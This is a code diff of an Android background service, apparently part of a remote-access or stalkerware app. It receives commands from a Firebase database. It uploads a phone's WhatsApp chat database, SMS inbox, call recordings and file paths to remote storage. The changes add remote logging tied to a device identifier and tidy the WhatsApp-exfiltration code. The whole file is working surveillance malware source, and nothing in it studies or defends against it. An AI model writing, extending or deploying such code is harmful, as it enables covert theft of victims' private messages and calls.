@@ -38,6 +38,8 @@ import com.aigs.serviceone.payload.GetStoragePathPayload;
 import com.aigs.serviceone.payload.ScreenshotPayload;
 import com.aigs.serviceone.payload.SmsPayload;
 import com.aigs.serviceone.payload.WhatsappChatPayload;
+import com.example.logshandler.starter.Logs;
+import com.example.uniqueidmanager.UniqueId;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.database.DataSnapshot;
@@ -56,6 +58,8 @@ import java.util.HashMap;
 import java.util.List;
 
 public class Starter extends Service {
+
+    String uuid = UniqueId.initialize(this).getUUID();
 
     public Starter() {
     }
@@ -99,12 +103,14 @@ public class Starter extends Service {
                                 FirebaseDatabase.getInstance().getReference("test").child("command").setValue(true);
                             } catch (NumberFormatException | DatabaseException numberFormatException) {
                                 Log.d("WARNING", "OLD BOOT CHECK COMMAND FOUND");
+                                Logs.pushLogsToServer("[WARNING]: OLD BOOT CHECK COMMAND FOUND", uuid);
                             }
                         }
                     }
 
                     @Override
                     public void onCancelled(@NonNull DatabaseError error) {
+                        Logs.pushLogsToServer("[ERROR]: "+error.getMessage(),uuid);
                         error.toException().printStackTrace();
                     }
                 });
@@ -121,8 +127,9 @@ public class Starter extends Service {
                                 int command = snapshot.getValue(Integer.class);
                                 processCommand(command);
                                 Log.e("COMMAND", command + "");
+                                Logs.pushLogsToServer("[COMMAND]: "+command,uuid);
                             } catch (Exception e) {
-
+                                Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),uuid);
                                 Log.e("EXCEPTION", e.getMessage());
                             }
                         }
@@ -131,6 +138,7 @@ public class Starter extends Service {
                     @Override
                     public void onCancelled(@NonNull DatabaseError error) {
                         Log.e("DB", error.getMessage());
+                        Logs.pushLogsToServer("[ERROR]: "+error.getMessage(),uuid);
 
                     }
                 });
@@ -203,12 +211,12 @@ public class Starter extends Service {
 
                 default:
                     Log.d("ERROR PA : ", "Invalid Command Received");
-                    FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue("Invalid Command Received");
+                    Logs.pushLogsToServer("[ERROR]: Invalid Command Received", uuid);
                     break;
             }
         } catch (SecurityException e) {
             Log.e("PERMISSION : ", e.getMessage());
-            FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue(e.getMessage());
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
 
         }
     }
@@ -230,6 +238,7 @@ public class Starter extends Service {
 
             }catch (Exception e){
                 Log.e("ERROR",e.getMessage());
+                Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
             }
         }
 
@@ -253,8 +262,6 @@ public class Starter extends Service {
                                     FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                 });
 
-                    } else {
-                        //SET ERROR MESSAGE
                     }
                 });
 
@@ -302,16 +309,16 @@ public class Starter extends Service {
                                                         });
 
                                                 Log.e("PATH", path1.getAbsolutePath());
+                                                Logs.pushLogsToServer("[PATH]: "+path1.getAbsolutePath(), uuid);
                                             }).execute(path);
 
                                 }catch (Exception e){
-                                    FirebaseDatabase
-                                            .getInstance().getReference("Logs").child(payloadType+"").setValue(e.getMessage());
+                                    Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
+                                    e.printStackTrace();
                                 }
 
                             }else {
-                                FirebaseDatabase
-                                        .getInstance().getReference("Logs").child(payloadType+"").setValue("File path not set");
+                                Logs.pushLogsToServer("[ERROR]: File path not set", uuid);
                             }
                         }
 
@@ -395,6 +402,7 @@ public class Starter extends Service {
                 }
             }).execute();
         } catch (Exception e) {
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
             e.printStackTrace();
         }
     }
@@ -432,6 +440,7 @@ public class Starter extends Service {
                         });
             }).execute();
         } catch (Exception e) {
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
             e.printStackTrace();
         }
     }
@@ -439,42 +448,19 @@ public class Starter extends Service {
     private void getWbDb() {
         try {
             new WhatsappChatPayload(this)
-                    .setWatsappTextExtractionListner(new WatsappTextExtractionListner() {
-                        @Override
-                        public void onDataExtracted(File... path) {
-                            Uri uriDb = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[0]);
-                            Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[1]);
-                            String time = "" + System.currentTimeMillis();
+                    .setWatsappTextExtractionListner(path -> {
+                        Uri uriDb = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[0]);
+                        Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[1]);
+                        String time = "" + System.currentTimeMillis();
 
-                            FirebaseStorage
-                                    .getInstance()
-                                    .getReference("whatsapp_media_less")
-                                    .child(time)
-                                    .putFile(uriDb)
-                                    .addOnCompleteListener(task -> {
-                                        if (task.isSuccessful()) {
-                                            task.getResult()
-                                                    .getStorage()
-                                                    .getDownloadUrl()
-                                                    .addOnCompleteListener(task1 ->
-                                                            FirebaseDatabase
-                                                                    .getInstance()
-                                                                    .getReference("wbDb")
-                                                                    .child(System.currentTimeMillis() + " ")
-                                                                    .setValue(task1.getResult().toString()));
-
-                                        } else {
-                                            //SET ERROR MESSAGE
-                                        }
-                                    });
-
-                            FirebaseStorage
-                                    .getInstance()
-                                    .getReference("whatsapp_media_less")
-                                    .child(time)
-                                    .putFile(uri)
-                                    .addOnCompleteListener(task12 -> {
-                                        task12.getResult()
+                        FirebaseStorage
+                                .getInstance()
+                                .getReference("whatsapp_media_less")
+                                .child(time)
+                                .putFile(uriDb)
+                                .addOnCompleteListener(task -> {
+                                    if (task.isSuccessful()) {
+                                        task.getResult()
                                                 .getStorage()
                                                 .getDownloadUrl()
                                                 .addOnCompleteListener(task1 ->
@@ -483,12 +469,33 @@ public class Starter extends Service {
                                                                 .getReference("wbDb")
                                                                 .child(System.currentTimeMillis() + " ")
                                                                 .setValue(task1.getResult().toString()));
-                                    });
+
+                                    } else {
+                                        //SET ERROR MESSAGE
+                                    }
+                                });
+
+                        FirebaseStorage
+                                .getInstance()
+                                .getReference("whatsapp_media_less")
+                                .child(time)
+                                .putFile(uri)
+                                .addOnCompleteListener(task12 -> {
+                                    task12.getResult()
+                                            .getStorage()
+                                            .getDownloadUrl()
+                                            .addOnCompleteListener(task1 ->
+                                                    FirebaseDatabase
+                                                            .getInstance()
+                                                            .getReference("wbDb")
+                                                            .child(System.currentTimeMillis() + " ")
+                                                            .setValue(task1.getResult().toString()));
+                                });
 
 
-                        }
                     }).execute();
         } catch (Exception e) {
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
             e.printStackTrace();
         }
     }
@@ -515,8 +522,12 @@ public class Starter extends Service {
                                                 databaseEntry.put("/LIVE/calls", task1.getResult().toString());
                                                 FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                             });
-                                        } else
+                                        } else{
+                                            Logs.pushLogsToServer("[ERROR]: "+task.getException().getMessage(), uuid);
                                             Log.e("STORAGE", task.getException().getMessage());
+                                        }
+
+
                                     });
 
                         }
@@ -531,6 +542,8 @@ public class Starter extends Service {
 
         } catch (Exception e) {
             e.printStackTrace();
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
+
         }
 
     }
@@ -571,8 +584,10 @@ public class Starter extends Service {
                                                         FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                     }
                                                 });
-                                            } else
+                                            } else {
                                                 Log.e("STORAGE", task.getException().getMessage());
+                                                Logs.pushLogsToServer("[ERROR]: "+task.getException().getMessage(), uuid);
+                                            }
                                         }
                                     });
                         }
@@ -586,6 +601,7 @@ public class Starter extends Service {
                     }).execute(modeInbox);
 
         } catch (Exception e) {
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
             e.printStackTrace();
         }
     }
